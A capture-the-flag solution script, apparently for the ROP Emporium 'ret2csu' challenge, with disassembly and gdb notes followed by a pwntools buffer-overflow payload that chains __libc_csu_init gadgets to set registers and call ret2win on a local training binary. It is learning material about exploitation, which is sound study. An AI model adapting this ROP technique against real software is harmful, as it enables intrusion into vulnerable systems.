"""
  40075f:       b8 18 10 60 00          mov    eax,0x601018
  400764:       48 c7 00 00 00 00 00    mov    QWORD PTR [rax],0x0
  40076b:       b8 28 10 60 00          mov    eax,0x601028
  400770:       48 c7 00 00 00 00 00    mov    QWORD PTR [rax],0x0
  400777:       b8 30 10 60 00          mov    eax,0x601030
  40077c:       48 c7 00 00 00 00 00    mov    QWORD PTR [rax],0x0

  40079b:       b8 38 10 60 00          mov    eax,0x601038
  4007a0:       48 c7 00 00 00 00 00    mov    QWORD PTR [rax],0x0

ret2win
  rbp-0x24 ==> arg1
  rbp-0x28 ==> arg2
  rbp-0x30 ==> arg3
  rbp-0x20 ==> num1( 0xaacca9d1d4d7dcc0 )Q#400928 <_IO_stdin_used+0x68>
  rbp-0x18 ==> num2( 0xd5bed0dddfd28920 )Q#400930 <_IO_stdin_used+0x70>
  rbp-0x10 ==> num3( 0xaa 0xxx )W#400938 <_IO_stdin_used+0x78>
  rbp-0x08 ==> rbp-0x20

num1 ^= arg3
rbp-0x20 ==> '/bin/cat'

?rbp-0x08 ==> rbp-0x17
?rbp-0x8 ==> arg3 ^ num( 0xaad5bed0dddfd289 )
rbp-0x18 ==> ' flag.txt'

system( rbp-0x20 )

gdb-peda$ x/gx 0x400928
0x400928:	0xaacca9d1d4d7dcc0
gdb-peda$ x/gx 0x400930
0x400930:	0xd5bed0dddfd28920
gdb-peda$ x/bx 0x400938
0x400938:	0xaa
"""

from pwn import *

elf = ELF("./ret2csu")
p = process("./ret2csu")

payload = b''
payload += b'A'*0x20
payload += b'BBBBBBBB'
payload += p64( 0x40089a ) #pop rbx,rbp,r12,r13,r14,r15;ret
payload += p64( 0 ) #rbx
payload += p64( 1 ) #rbp
payload += p64( 0x600e38) #r12 init
payload += p64( 0 ) #r13
payload += p64( 0 ) #r14
payload += p64( 0xdeadcafebabebeef ) #r15
payload += p64( 0x400880 ) #mov rdx,r15;mov rsi,r14;mov edi,r13d;call [r12+rbx*8]
payload += p64( 0 ) #add rsp,0x08
payload += p64( 0 ) #rbx
payload += p64( 0 ) #rbp
payload += p64( 0 ) #r12
payload += p64( 0 ) #r13
payload += p64( 0 ) #r14
payload += p64( 0 ) #r15
payload += p64( elf.symbols["ret2win"] )

p.recvuntil("> ")
p.sendline( payload )

open('output', 'bw' ).write( payload )
info("flag :%s",  p.recv() )

